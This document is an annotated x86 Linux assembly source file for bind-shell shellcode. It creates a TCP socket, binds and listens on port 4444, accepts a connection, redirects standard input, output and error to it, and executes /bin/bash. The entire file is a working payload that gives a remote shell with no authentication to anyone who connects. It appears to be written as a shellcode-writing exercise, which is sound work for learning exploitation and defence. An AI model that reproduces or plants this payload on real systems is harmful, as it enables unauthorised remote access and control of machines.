; Filename: shell_bind_tcp.asm
; Author: Simon Lemire / 2018
; Description: Bind shellcode on port 4444, executes a shell
; Note: Uses sys_socketcall

global _start

section .text

_start:

	; Zero registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; Create socket
	mov al, 0x66		; sys_socketcall
	mov bl, 0x1			; SYS_SOCKET
	push 0x6			; int protocol -> IPPROTO_TCP
	push 0x1			; int type -> SOCK_STREAM
	push 0x2			; int domain -> AF_INET
	mov ecx, esp
	int 0x80			; sys_socketcall (SYS_SOCKET)
	mov edi, eax		; save socket fd

	; Create addr struct
	push edx			; NULL padding
	push edx			; NULL padding
	push edx			; sin.addr (0.0.0.0)
	push word 0x5c11	; Port
	push word 0x2		; AF_INET
	mov esi, esp

	; Bind socket
	mov al, 0x66		; sys_socketcall
	mov bl, 0x2			; SYS_BIND
	push 0x10			; socklen_t addrlen
	push esi			; const struct sockaddr *addr
	push edi			; int sockfd -> saved socket fd
	mov ecx, esp
	int 0x80			; sys_socketcall (SYS_BIND)

	; Listen for connection
	mov al, 0x66		; sys_socketcall
	mov bl, 0x4			; SYS_LISTEN
	push edx			; int backlog -> NULL
	push edi			; int sockfd -> saved socket fd
	mov ecx, esp
	int 0x80			; sys_socketcall (SYS_LISTEN)

	; Accept connection
	mov al, 0x66		; sys_socketcall
	mov bl, 0x5			; SYS_ACCEPT
	push edx			; socklen_t *addrlen -> NULL
	push edx			; struct sockaddr *addr -> NULL
	push edi			; int sockfd -> saved sock fd value
	mov ecx, esp
	int 0x80	 		; sys_socketcall (SYS_ACCEPT)
	mov edi, eax

	; Redirect STDIN, STDOUT, STDERR to socket
	xor ecx, ecx
	mov cl, 0x3			; counter for loop (stdin to stderr)
	mov ebx, edi		; socket fd

	dup2:
	mov al, 0x3f		; sys_dup2
	dec ecx	
	int 0x80			; sys_dup2
	inc ecx
	loop dup2

	; execve()
	xor eax, eax
	push 0x41687361		; ///bin/bashA
	push 0x622f6e69
	push 0x622f2f2f
	mov byte [esp + 11], al	; NULL terminate string
	mov al, 0xb			; sys_execve
	mov ebx, esp		; const char *filename
	xor ecx, ecx 		; char *const argv[]
	xor edx, edx		; char *const envp[]
	int 0x80			; sys_execve
